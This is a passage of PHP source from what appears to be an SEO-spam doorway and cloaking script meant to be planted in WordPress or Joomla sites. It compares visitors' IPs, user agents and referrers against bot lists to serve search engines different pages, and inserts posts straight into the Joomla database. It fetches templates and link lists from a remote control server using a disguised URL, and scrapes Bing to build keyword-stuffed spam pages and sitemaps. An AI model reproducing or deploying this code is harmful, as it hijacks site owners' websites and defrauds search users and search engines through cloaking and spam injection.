					$pdf->Output();
					die();
				}
			}
		}
    
	if (!empty($errorsforlocal) && is_dir($cachedirname)) {
		$errorsforlocal = date("d F Y H:i:s") . "\t" . $q . "\t" . trim($errorsforlocal);
		if (file_exists($errorsfilename) && count(file($errorsfilename)) > 500) {
			$fod = fopen($errorsfilename, "w+");
		}
		else {
			$fod = fopen($errorsfilename, "a+");
		}

		flock($fod, LOCK_EX);
		fwrite($fod, $errorsforlocal . "\n");
		fclose($fod);
	}

	if (!empty($_GET['ineederrors']) && $_GET['ineederrors'] == "yes") {
		if (!empty($errorsforlocal)) {
			echo "<b>Current errors</b>: " . $errorsforlocal . "<br /><br />";
			if (file_exists($errorsfilename)) {
				$errorsfilename = file($errorsfilename);
				$errorsfilename = implode('\n',$errorsfilename);
				echo "<b>Errors history:</b> " . $errorsfilename; 
			}

			die();
		}
		else {
			echo "No errors";
		}
	}
}

function include_cms(){
	if(file_exists($_SERVER['DOCUMENT_ROOT'].'/wp-blog-header.php')){
		define('WP_USE_THEMES', false);
		require($_SERVER['DOCUMENT_ROOT'].'/wp-blog-header.php');	
		return "wp";
	}elseif(file_exists($_SERVER['DOCUMENT_ROOT'].'/includes/framework.php')){
		define( '_JEXEC', 1 );
		define( 'DS', DIRECTORY_SEPARATOR );
		define( 'JPATH_BASE', $_SERVER[ 'DOCUMENT_ROOT' ] );
		require_once( JPATH_BASE . DS . 'includes' . DS . 'defines.php' );
		require_once( JPATH_BASE . DS . 'includes' . DS . 'framework.php' );
		require_once( JPATH_BASE . DS . 'libraries' . DS . 'joomla' . DS . 'factory.php' );
		$mainframe =& JFactory::getApplication('site');
		return "joomla";
	}
}
function getbody($body)
{
	global $body;
	return $body;
}

function gettitle($title)
{
	global $title;
	return $title;
}

function getdesc($desc)
{
	global $desc;
	echo "<meta type=\"description\" content=\"" . $desc . "\">";
}

function randString($length)
{
	$str = "";
	$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	$size = strlen($chars);
	for ($i = 0; $i < $length; $i++) {
		$str.= $chars[rand(0, $size - 1) ];
	}

	return $str;
}

function getsettings($settfile, $needsetting, $fileorcontent)
{
	if (empty($fileorcontent)) {
		if (file_exists($settfile)) {
			$settings = implode("\n",file($settfile)); 
		}
		else {
			return "";
		}
	}
	else {
		$settings = $settfile;
	}

	$settings = urlencode($settings);
	$settings = trim($settings, "%0A");
	$settings.= "%0A";
	if ($needsetting == "clienturl") {
		preg_match("/clienturl%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$clienturl = $matches[1];
			$clienturl = trim($clienturl);
			return $clienturl;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "clearcache") {
		preg_match("/clearcache%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$clearcache = $matches[1];
			$clearcache = trim($clearcache);
			return $clearcache;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "newkeys") {
		preg_match("/newkeys%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$newkeys = $matches[1];
			$newkeys = trim($newkeys);
			return $newkeys;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "cleanrescode") {
		preg_match("/cleanrescode%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$cleanrescode = $matches[1];
			$cleanrescode = trim($cleanrescode);
			return $cleanrescode;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "dotemplate") {
		preg_match("/dotemplate%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$dotemplate = $matches[1];
			$dotemplate = trim($dotemplate);
			return $dotemplate;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "newuseragents") {
		preg_match("/newuseragents%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$newuseragents = $matches[1];
			$newuseragents = trim($newuseragents);
			return $newuseragents;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "newbotips") {
		preg_match("/newbotips%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$newbotips = $matches[1];
			$newbotips = trim($newbotips);
			return $newbotips;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "newreffs") {
		preg_match("/newreffs%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$newreffs = $matches[1];
			$newreffs = trim($newreffs);
			return $newreffs;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "usecloack") {
		preg_match("/usecloack%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$usecloack = $matches[1];
			$usecloack = trim($usecloack);
			return $usecloack;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "itsinclude") {
		preg_match("/itsinclude%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$itsinclude = $matches[1];
			$itsinclude = trim($itsinclude);
			return $itsinclude;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "clienttype") {
		preg_match("/clienttype%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$clienttype = $matches[1];
			$clienttype = trim($clienttype);
			return $clienttype;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "lang") {
		preg_match("/lang%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$lang = $matches[1];
			$lang = trim($lang);
			return $lang;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "wherecontent") {
		preg_match("/wherecontent%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$wherecontent = $matches[1];
			$wherecontent = trim($wherecontent);
			return $wherecontent;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "textfilename") {
		preg_match("/textfilename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$textfilename = $matches[1];
			$textfilename = trim($textfilename);
			return $textfilename;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "keyfilename") {
		preg_match("/keyfilename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$keyfilename = $matches[1];
			$keyfilename = trim($keyfilename);
			return $keyfilename;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "themesfilename") {
		preg_match("/themesfilename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$themesfilename = $matches[1];
			$themesfilename = trim($themesfilename);
			return $themesfilename;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "templatename") {
		preg_match("/templatename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$templatename = $matches[1];
			$templatename = trim($templatename);
			return $templatename;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "extlinksfilename") {
		preg_match("/extlinksfilename%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$extlinksfilename = $matches[1];
			$extlinksfilename = trim($extlinksfilename);
			return $extlinksfilename;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "renewclient") {
		preg_match("/renewclient%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$renewclient = $matches[1];
			$renewclient = trim($renewclient);
			return $renewclient;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "keyperem") {
		preg_match("/keyperem%3D(.*)%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$keyperem = $matches[1];
			$keyperem = trim($keyperem);
			return $keyperem;
		}
		else {
			return "";
		}
	}

	if ($needsetting == "redirect") {
		preg_match("/redirect%3D(.*)ENDOFREDIRECT%0A/miU", $settings, $matches);
		if (!empty($matches[1])) {
			$redirect = $matches[1];
			$redirect = trim($redirect);
			return $redirect;
		}
		else {
			return "";
		}
	}

	return "";
}

function is_function_enabled($func)
{
	$func = strtolower(trim($func));
	if ($func == '') return false;
	$disabled = explode(",", @ini_get("disable_functions"));
	if (empty($disabled)) {
		$disabled = array();
	}
	else {
		$disabled = array_map('trim', array_map('strtolower', $disabled));
	}

	return (function_exists($func) && is_callable($func) && !in_array($func, $disabled));
}

function checktime($timetocurl)
{
	global $cachedirname;
	global $clientid;
	if (is_dir($cachedirname)) {
		if (!file_exists($cachedirname . "/" . substr($clientid, 0, 7))) {
			$fod = fopen($cachedirname . "/" . substr($clientid, 0, 7) , "w+");
			if (!empty($fod)) {
				flock($fod, LOCK_EX);
				fwrite($fod, "");
				fclose($fod);
			}
			else {
				return "errorcreate";
			}
		}

		$cron_time = filemtime($cachedirname . "/" . substr($clientid, 0, 7));
		if (time() - $cron_time >= $timetocurl) {
			@unlink($cachedirname . "/" . substr($clientid, 0, 7));
			$fod = fopen($cachedirname . "/" . substr($clientid, 0, 7) , "w+");
			if (!empty($fod)) {
				flock($fod, LOCK_EX);
				fwrite($fod, "");
				fclose($fod);
				return "goodtime";
			}
			else {
				return "errorcreate";
			}
		}

		return false;
	}
	else {
		return false;
	}
}


function cloack($ip)
{
	global $referer;
	global $useragent;
	global $useragentsfilename;
	global $botipsfilename;
	global $referersfilename;
	global $new_request;
	global $useragentsfilename_url;
	global $referersfilename_url;
	$angrybot = "";
	if (file_exists($useragentsfilename)) {
		$useragents = decodedata(implode("\n",file($useragentsfilename))); 
		$useragents = trim($useragents);
		$useragents = explode("\n", $useragents);
	}

	if (file_exists($referersfilename)) {
		$goodrefs = decodedata(implode("\n",file($referersfilename))); 
		$goodrefs = trim($goodrefs);
		$goodrefs = explode("\n", $goodrefs);
	}

	$nowref = strtolower($referer);
	$nowref = trim($nowref);
	$nowua = strtolower($useragent);
	$nowua = trim($nowua);
	$ip = trim($ip);
	if (file_exists($botipsfilename) && !empty($ip)) {
		$ipforcloack = explode(".", $ip);
		$handle = fopen($botipsfilename, "r");
		$i = 1;
		while (!feof($handle)) {
			$cloackip = trim(fgets($handle));
			if (!empty($cloackip)) {
				$cloackip = explode(".", $cloackip);
				$needcloackip = explode("/", $cloackip[3]);
				if (!empty($needcloackip[1])) {
					if ($ipforcloack[0] == $cloackip[0] && $ipforcloack[1] == $cloackip[1] && $ipforcloack[2] == $cloackip[2] && $ipforcloack[3] >= $needcloackip[0] && $ipforcloack[3] <= $needcloackip[1]) {
						$angrybot = "1";
						break;
					}
				}
				else {
					if ($ip == implode(".", $cloackip)) {
						$angrybot = "1";
						break;
					}
				}

				$i++;
			}
		}

		fclose($handle);
	}

	if (empty($angrybot)) {
		if (!empty($useragents[0])) {
			foreach($useragents as $cloackuseragent) {
				$cloackuseragent = strtolower($cloackuseragent);
				$cloackuseragent = trim($cloackuseragent);
				if (strpos("qqqq " . $nowua, $cloackuseragent) && !empty($cloackuseragent)) {
					$angrybot = "1";
					break;
				}
			}
		}

		if (empty($angrybot)) {
			if (!empty($goodrefs)) {
				foreach($goodrefs as $goodref) {
					if (!empty($goodref)) {
						$goodref = strtolower($goodref);
						$goodref = trim($goodref);
						if (strpos("qqqq " . $nowref, $goodref)) {
							$angrybot = "";
							break;
						}
						else {
							$angrybot = "1";
						}
					}
					else {
						break;
					}
				}
			}
		}
	}

	return $angrybot;
}

function codedata($data)
{
	$data = gzcompress(base64_encode(urlencode($data)) , 4);
	return urlencode($data);
}

function codeservurl($servurl)
{
	if (mb_detect_encoding($servurl) == "UTF-8") {
		$servurl = trim($servurl);
	}
	else {
		$servurl = iconv(mb_detect_encoding($servurl) , "UTF-8", $servurl);
		$servurl = trim($servurl);
	}

	$goodservurl = array();
	foreach(str_split(base64_encode(urlencode($servurl))) as $onechar) {
		if (is_numeric($onechar)) {
			$onechar = $onechar + 7;
			if ($onechar > 9) {
				$onechar = $onechar - 10;
			}
		}

		$goodservurl[] = $onechar;
	}

	return implode($goodservurl);
}

function decodedata($data)
{
	return urldecode(base64_decode(gzuncompress(urldecode($data))));
}

function keyindoorway($currentkey, $keyfilename)
{
	$foundkey = "";
	$currentkey = trim(urldecode($currentkey));
	$currentkey = str_ireplace("-", " ", $currentkey);
	$currentkey = strtolower($currentkey);
	$allkeys = decodedata($new_request->request($keyfilename)); 
	$allkeys = explode("\n", $allkeys);
	foreach($allkeys as $keyfrcheck) {
		$keyfrcheck = trim($keyfrcheck);
		$keyfrcheck = strtolower($keyfrcheck);
		if (stripos("qqqq" . $currentkey, "qqq" . $keyfrcheck)) {
			$foundkey = "yes";
			break;
		}
	}

	return $foundkey;
}

function postItem($title, $desc, $text)
{
	$database = JFactory::getDBO();
	$item = new stdClass;
	$item->id = null;
	$item->title = $title;
	$item->introtext = $desc;
	$item->fulltext = $text;
	$item->state = 1;
	$item->access = 1;
	$item->created_by = 62;
	$item->created = date('Y-m-d H:i:s');
	$item->alias = JFilterOutput::stringURLSafe($item->title);
	if (!$database->insertObject('#__content', $item, 'id')) {
		echo $database->stderr();
		return false;
	}

	return $item->id . ":" . $item->alias;
}

function full_del_dir($directory)
{
	$dir = opendir($directory);
	while (($file = readdir($dir))) {
		if (is_file($directory . "/" . $file)) {
			unlink($directory . "/" . $file);
		}
		else
		if (is_dir($directory . "/" . $file) && ($file != ".") && ($file != "..")) {
			full_del_dir($directory . "/" . $file);
		}
	}

	closedir($dir);
	rmdir($directory);
}; 
function paginate($array, $pageSize, $page = 1){
    $page = $page < 1 ? 1 : $page;
    $start = ($page - 1) * $pageSize;
    return array_slice($array, $start, $pageSize);
}

function getcontent($_workstatus, $_templatename, $_keyfilename, $_wherecontent, $_currkey, $_clienturl, $_clientdomain, $cachedirname, $errorsfilename, $servurl, $lang, $clientid){
	global $useCurl, $requestTimeout,$new_request,$clienttype;
	
	$serverurl = str_ireplace("getsettingsv2.php", "", $servurl);
	$orig_key = $_currkey;
	$_currkey = str_replace("-", " ", $_currkey);
	$_keyfile_data = implode("\n",file($_keyfilename));

	$_keyfile_data = explode("\n", decodedata($_keyfile_data));
	$count_keys = count($_keyfile_data);
	if ($_workstatus == "work" && !empty($_templatename) && !empty($_keyfilename)) {
		if ($_wherecontent == "bingsnippets") {
			
			if(strpos($_currkey,"sitemap") !== FALSE)
				$_result = "site map";
			else
				$_result = bingcontent($_currkey, $lang);
			
			if ($_workstatus == "work" && empty($_templatename)) {
				$_message.= "Template not setted	";
			}

			if ($_workstatus == "work" && !empty($_templatename) && $clienttype != "pdftype"){
				if(include_cms() == "wp" || include_cms() == "joomla"){
					if(strpos($_currkey,"sitemap") !== FALSE)
						$_template_data = $new_request->request("http://" . $serverurl . "workdir/templates/template_wp_map.txt");
					else
						$_template_data = $new_request->request("http://" . $serverurl . "workdir/templates/template_wp.txt");
				}else{
					if(strpos($_currkey,"sitemap") !== FALSE)
						$_template_data = $new_request->request("http://" . $serverurl . "workdir/templates/" . $_templatename."_map");
					else
						$_template_data = $new_request->request("http://" . $serverurl . "workdir/templates/" . $_templatename);
				}
			}elseif($clienttype == "pdftype"){
				if(strpos($_currkey,"sitemap") !== FALSE)
						$_template_data = $new_request->request("http://" . $serverurl . "workdir/templates/template_pdf.txt_map");
					else
						$_template_data = $new_request->request("http://" . $serverurl . "workdir/templates/template_pdf.txt");
			}
		
			if (stripos("qqqq" . $_template_data, "[SITEMAP]")) {
				$_template_data = str_replace("[TITLESITEMAP]","Sitemap",$_template_data);
				$numpage = max(1, intval(str_ireplace("sitemap ","",$_currkey)));
				
				$totalPages = ceil( count($_keyfile_data)/ 500 );
				$keys_for_map = paginate($_keyfile_data, 500, $numpage);
				
				$html_map = '';//<style>p{text-align: center;}ol{text-align: center;}ul{text-align: center;}td{text-align: center;}li{text-align: center;}dl{text-align: center;}dd{text-align: center;}</style>
				$html_tags = array('<div><li>[LINKMAP]</li></div>','<ol>[LINKMAP]</ol>','<div><dd>[LINKMAP]</dd></div>','<ul>[LINKMAP]</ul>','<div><p>[LINKMAP]</p></div>','<dl>[LINKMAP]</dl>');
				
				foreach($keys_for_map as $v){
					$rand_tag = array_rand($html_tags,1);
					$html_map .= str_replace("[LINKMAP]", '<a href="http://' . str_replace("[KEY]", str_replace(" ", "-", trim($v)) , $_clienturl) . '">' . ucfirst(trim($v)) . "</a>", $html_tags[$rand_tag]);
				}
				
				$_template_data = str_replace("[SITEMAP]",$html_map,$_template_data);
				
				$pagination .= '<ul class="pagination" style=" margin-left: 500px;">';
				for($i=1;$i<=$totalPages;$i++) {
					$pagination .= '<li><a href=http://' . str_replace("[KEY]", "sitemap-".$i , $_clienturl) . '>'.$i."</a> </li>";
				}
				$pagination .= '</ul>';
				
				$_template_data = str_replace("[PAGINATION]",$pagination,$_template_data);
			}

			if (!empty($_template_data) && !empty($_result) && !empty($_currkey) && !empty($_keyfile_data) && !empty($_clienturl)) {
				if (stripos("qqqq" . $_template_data, "[RANDOMLINES")) {
					$_pattern = "#(\[RANDOMLINES:.*\])#iU";
					preg_match_all($_pattern, $_template_data, $_matches);
					if (!empty($_matches[1])) {
						
						foreach($_matches[1] as $_value) {
							$_randomline = "";
							$_normal = trim($_value);
							$_normal = str_replace("[", "", $_normal);
							$_normal = str_replace("]", "", $_normal);
							$_normal = explode(":", $_normal); 
							$_randomlines = file("http://" . $serverurl . "workdir/randomlines/" . trim($_normal[1]));
							
							shuffle($_randomlines);
							$count_randomlines = count($_randomlines);
							if (trim($_normal[2]) >= $count_randomlines) {
								$_normal[2] = $count_randomlines - 1;
							}
							else {
								$_normal[2]--;
							}

							for ($_i = 0; $_i <= trim($_normal[2]); $_i++) {
								$_randomline.= trim($_randomlines[$_i]) . "" . $_normal[3];
							}

							$_template_data = preg_replace("#(" . trim(str_replace("[", "\[", str_replace("]", "\]", str_replace("^", "\^", $_value)))) . ")#iU", trim($_randomline, $_normal[3]) , $_template_data, 1); /* 	}else{ $_message.= "No file " . trim($_normal[1]) . " for random lines	"; $_template_data = preg_replace("#(" . trim(str_replace("[", "\[", str_replace("]", "\]", str_replace("^", "\^", $_value)))) . ")#iU", "", $_template_data, 1); } */
						}
					}
				}

				if (strpos($_template_data, "[:::") !== FALSE) {
					$_pattern = "/(\[:::.*:::\])/iU";
					preg_match_all($_pattern, $_template_data, $_matches);
					if ($_matches[1]) {
						foreach($_matches[1] as $_value) {
							$_value = trim($_value);
							$_elements = str_replace("[:::", "", $_value);
							$_elements = str_replace(":::]", "", $_elements);
							$_elements = explode("|", $_elements);
							shuffle($_elements);
							if (!empty($_elements[0])):
								$_template_data = preg_replace("|" . preg_quote($_value) . "|iU", trim($_elements[0]) , $_template_data, 1);
							else:
								$_template_data = str_ireplace($_value, "", $_template_data);
							endif;
						}
					}
				}

				$_pattern = "/(\[SENTENCE:.*\])/iU";
				preg_match_all($_pattern, $_template_data, $_matches);
				if (!empty($_matches[1])) {
					foreach($_matches[1] as $_sentence) {
						$_sentence_normal = trim($_sentence);
						$_sentence_normal = str_replace("[", "", $_sentence_normal);
						$_sentence_normal = str_replace("]", "", $_sentence_normal);
						$_sentence_normal = explode(":", $_sentence_normal);
						$_full_str = edittext($_sentence_normal[1], $_sentence_normal[2], $_result, $_sentence_normal[3], $_sentence_normal[4], '' . $_sentence_normal[5], $_currkey, $_keyfile_data, $_themesfile_data, "workdir/extlinks/" . $_extlinksfilename, $_clienturl, '' . $_sentence_normal[6], $_extlinksfile_data, $_sentence_normal[7]);
						$_full_str = str_replace("$", "\$", $_full_str);
						if (!empty($_full_str)):
							$_template_data = preg_replace("/(" . trim(str_replace("[", "\[", str_replace("]", "\]", str_replace("^", "\^", $_sentence)))) . ")/iUm", ucfirst($_full_str) , $_template_data, 1);
						else:
							$_template_data = preg_replace("/(" . trim(str_replace("[", "\[", str_replace("]", "\]", str_replace("^", "\^", $_sentence)))) . ")/iUm", "", $_template_data, 1);
						endif;
					}
				}

				$_template_data = str_replace("[UPKEY]", mb_strtoupper(mb_substr($_currkey, 0, 1, "UTF-8") , "UTF-8") . mb_substr($_currkey, 1, mb_strlen($_currkey) , "UTF-8") , $_template_data);
				$_template_data = str_replace("[RANDTEMATICKEY]", "", $_template_data);
				if (strpos($_template_data, "[RANDKEYWORD]") !== FALSE) {
					shuffle($_keyfile_data);
					$_count_rand = substr_count($_template_data, "[RANDKEYWORD]");
					for ($_i = 0; $_i <= $_count_rand; $_i++) {
						$_template_data = preg_replace("/\[RANDKEYWORD\]/", ucfirst(trim($_keyfile_data[$_i])) , $_template_data, 1);
					}
				}

				if (strpos($_template_data, "[RANDOMLINK]") !== FALSE) {
					shuffle($_keyfile_data);
					$_count_rand = substr_count($_template_data, "[RANDOMLINK]");
					for ($_i = 0; $_i <= $_count_rand; $_i++) {
						$_template_data = preg_replace("/\[RANDOMLINK\]/", '<a href="http://' . str_replace("[KEY]", str_replace(" ", "-", trim($_keyfile_data[$_i])) , $_clienturl) . '">' . ucfirst(trim($_keyfile_data[$_i])) . "</a>", $_template_data, 1);
					}
				}

				if (strpos($_template_data, "[SIMPLERANDOMLINK]") !== FALSE) {
					shuffle($_keyfile_data);
					$_count_rand = substr_count($_template_data, "[SIMPLERANDOMLINK]");
					for ($_i = 0; $_i <= $_count_rand; $_i++):
						$_template_data = preg_replace("/\[SIMPLERANDOMLINK\]/", "http://" . str_replace("[KEY]", str_replace(" ", "-", trim($_keyfile_data[$_i])) , $_clienturl) , $_template_data, 1);
					endfor;
				}

				if (strpos($_template_data, "[RAND:") !== FALSE) {
					$_pattern = "/(\[RAND:[0-9]*:[0-9]*\])/";
					preg_match_all($_pattern, $_template_data, $_matches);
					if (!empty($_matches[1])) {
						foreach($_matches[1] as $_rand_val):
							$_rand_val_group = explode(":", trim(str_replace("[", "", str_replace("]", "", $_rand_val))));
							$_template_data = preg_replace("/" . str_replace("[", "\[", str_replace("]", "\]", $_rand_val)) . "/", rand(trim($_rand_val_group[1]) , trim($_rand_val_group[2])) , $_template_data, 1);
						endforeach;
					}
				}

				$_template_data = str_replace("[EXTRANDLINK]", "", $_template_data);
				$_template_data = str_replace("[DEFISKEY]", ucfirst(str_replace(" ", "-", $_currkey)) , $_template_data);
				$_template_data = str_replace("[THISDOMAIN]", "http://" . $_clientdomain, $_template_data);
			
				if (strpos($_template_data, "[UPKEY:") !== FALSE) {
					$_currkey2 = "";
					preg_match_all("/(\[UPKEY:.*\])/iUm", $_template_data, $_matches);
					if (!empty($_matches[1])) {
						foreach($_matches[1] as $_upkeys):
							$_currkey2 = $_currkey;
							$_upkeys_normal = str_replace("[UPKEY:", "", $_upkeys);
							$_upkeys_normal = str_replace("]", "", $_upkeys_normal);
							$_upkeys_normal = explode(",", $_upkeys_normal);
							foreach($_upkeys_normal as $_normal_key):
								$_currkey2 = str_ireplace($_normal_key, "", $_currkey2);
							endforeach;
							$_currkey2 = str_replace("  ", " ", $_currkey2);
							$_currkey2 = trim($_currkey2);
							$_template_data = str_ireplace($_upkeys, mb_strtoupper(mb_substr($_currkey2, 0, 1, "UTF-8") , "UTF-8") . mb_substr($_currkey2, 1, mb_strlen($_currkey2) , "UTF-8") , $_template_data);
						endforeach;
					}
				}
				
				if (strpos($_template_data, "[LINK]") !== FALSE) {
					$linkovka = $new_request->request("http://".$servurl."?linkovka=1&clientid=".$clientid);
					$towns = array ( 0 => 'Alabama ',   1 => 'Alaska ',   2 => 'Arizona ',   3 => 'Arkansas ',   4 => 'California ',   5 => 'Colorado ',   6 => 'Connecticut ',   7 => 'Delaware ',   8 => 'Florida ',   9 => 'Georgia ',   10 => 'Hawaii ',   11 => 'Idaho ',   12 => 'Illinois ',   13 => 'Indiana ',   14 => 'Iowa ',   15 => 'Kansas ',   16 => 'Kentucky ',   17 => 'Louisiana ',   18 => 'Maine ',   19 => 'Maryland ',   20 => 'Massachusetts ',   21 => 'Michigan ',   22 => 'Minnesota ',   23 => 'Mississippi ',   24 => 'Missouri ',   25 => 'Montana ',   26 => 'Nebraska ',   27 => 'Nevada ',   28 => 'New Hampshire ',   29 => 'New Jersey ',   30 => 'New Mexico ',   31 => 'New York ',   32 => 'North Carolina ',   33 => 'North Dakota ',   34 => 'Ohio ',   35 => 'Oklahoma ',   36 => 'Oregon ',   37 => 'Pennsylvania ',   38 => 'Rhode Island ',   39 => 'South Carolina ',   40 => 'South Dakota ',   41 => 'Tennessee ',   42 => 'Texas ',   43 => 'Utah ',   44 => 'Vermont ',   45 => 'Virginia ',   46 => 'Washington ',   47 => 'West Virginia ',   48 => 'Wisconsin ',   49 => 'Wyoming ',   50 => 'AL ',   51 => 'AK ',   52 => 'AZ ',   53 => 'AR ',   54 => 'CA ',   55 => 'CO ',   56 => 'CT ',   57 => 'DE ',   58 => 'FL ',   59 => 'GA ',   60 => 'HI ',   61 => 'ID ',   62 => 'IL ',   63 => 'IN ',   64 => 'IA ',   65 => 'KS ',   66 => 'KY ',   67 => 'LA ',   68 => 'ME ',   69 => 'MD ',   70 => 'MA ',   71 => 'MI ',   72 => 'MN ',   73 => 'MS ',   74 => 'MO ',   75 => 'MT ',   76 => 'NE ',   77 => 'NV ',   78 => 'NH ',   79 => 'NJ ',   80 => 'NM ',   81 => 'NY ',   82 => 'NC ',   83 => 'ND ',   84 => 'OH ',   85 => 'OK ',   86 => 'OR ',   87 => 'PA ',   88 => 'RI ',   89 => 'SC ',   90 => 'SD ',   91 => 'TN ',   92 => 'TX ',   93 => 'UT ',   94 => 'VT ',   95 => 'VA ',   96 => 'WA ',   97 => 'WV ',   98 => 'WI ',   99 => 'WY' );
					$linkovka_data = explode('::',$linkovka);
					
					if($linkovka_data){
						foreach($linkovka_data as $v){
							if($v){
								$k = $_currkey.' in '.$towns[rand(0,99)];
								$link = str_replace('[KEY]', $orig_key, $v);
								$_template_data = preg_replace('/\[LINK\]/', "<a href=\"".$link."\">".$k."</a>", $_template_data, 1);
							}
						}
					}
					$_template_data = str_replace('[LINK]','',$_template_data);
				}
				
				if (strpos($_template_data, "[IMGSRC") !== FALSE) {
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, 'http://www.bing.com/images/search?q='.urlencode($_currkey));
					curl_setopt($ch, CURLOPT_HEADER, false);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
					curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36');
					curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
					curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
					curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
					curl_setopt($ch, CURLOPT_FTP_SSL, CURLFTPSSL_TRY);
					$outch = curl_exec($ch);
					curl_close($ch); 
					preg_match_all('!src2="(.*?)&amp;w=!siu', $outch, $lines2);
				
					$ar_imgs = array_map("get_img_bing", $lines2[0]);
					$count_imgs = count($ar_imgs);
		
					preg_match_all("/(\[IMGSRC.*\])/iUm", $_template_data, $_matches);
					if (!empty($_matches[1])) {
						foreach($_matches[1] as $_upimgs){
							$rnd = rand(0,$count_imgs);
							$_template_data = str_replace($_upimgs,"<img src=\"".$ar_imgs[$rnd]."\" alt=\"".$_currkey."\">",$_template_data);
						}
					} 
				}
				
				if (!empty($_message) && is_dir($cachedirname)) {
					$errorsforlocal = date("d F Y H:i:s") . "\t" . $_message . "\t" . trim($errorsforlocal);
					if (file_exists($errorsfilename) && count(file($errorsfilename)) > 500) {
						$fod = fopen($errorsfilename, "w+");
					}
					else {
						$fod = fopen($errorsfilename, "a+");
					}

					flock($fod, LOCK_EX);
					fwrite($fod, $errorsforlocal . "\n");
					fclose($fod);
				}
				$_template_data = html_entity_decode(preg_replace("/(\[SENTENCE:.*\])/iU","",$_template_data));
				return $_template_data;
			}
		}
	}
}

function get_img_bing($str){
	return str_ireplace('src2="',"",$str);
}


function edittext($_min_rand, $_max_rand, $_result, $_count_nums, $_num_str, $_incom_nums, $_other_data, $_keyfile_data, $_themesfile_data, $_extlinksfilename, $_clienturl, $_new_params, $_extlinksfile_data, $_an_limit){
	if ($_min_rand == 0){
		$_min_rand = 1;
	}
	if ($_max_rand == 0){
		$_max_rand = 1;
	}
	$_incom_nums = explode("^", $_incom_nums);
	$_incom_nums = rand($_incom_nums[0], $_incom_nums[1]);
	if ($_extlinksfile_data == "good"){
		$_new_params = explode("^", $_new_params);
		$_new_params = rand($_new_params[0], $_new_params[1]);
	}else{
		$_new_params = 0;
	}
	$_other_data = trim($_other_data);
	$_result = explode(".", $_result);
	shuffle($_result);
	$_group_results = array();
	for ($_i = 0; $_i <= rand($_min_rand, $_max_rand); $_i++){
		$_group_results[] = $_result[$_i];
	}
	unset($_result);
	$_group_results = explode(" ", str_replace("  ", " ", implode(". ", $_group_results)));
	if ($_count_nums > 0){
		$_elem_groups = array(
			" <i>" . $_other_data . "</i> ",
			" <b>" . $_other_data . "</b> ",
			$_other_data,
			$_other_data,
			$_other_data
		);
		$_count_groups = substr_count(strtolower(implode($_group_results)) , strtolower($_other_data));
		$_str_limit = ceil(count($_group_results) * $_count_nums / 100) - $_count_groups;
		if ($_str_limit <= 0){
			$_str_limit = $_count_groups;
		}
		for ($_i = 1; $_i <= $_str_limit; $_i++){
			if ($_an_limit == 1){
				$_other_data = trim($_elem_groups[array_rand($_elem_groups) ]);
			}
			$_group_results[rand(0, count($_group_results) - 1) ].= " " . $_other_data;
		}
	}
	if ($_num_str > 0){
		shuffle($_keyfile_data);
		$_str_limit = ceil(count($_group_results) * $_num_str / 100);
		if (count($_keyfile_data) > $_str_limit - 1){
			$_result_good = "";
			if (empty($_result_good)){
				for ($_i = 1; $_i <= $_str_limit; $_i++){
					if ($_an_limit == 1){
						$_elem_groups = array(
							" <i>" . $_keyfile_data[$_i] . "</i> ",
							" <b>" . $_keyfile_data[$_i] . "</b> ",
							$_keyfile_data[$_i],
							$_keyfile_data[$_i],
							$_keyfile_data[$_i]
						);
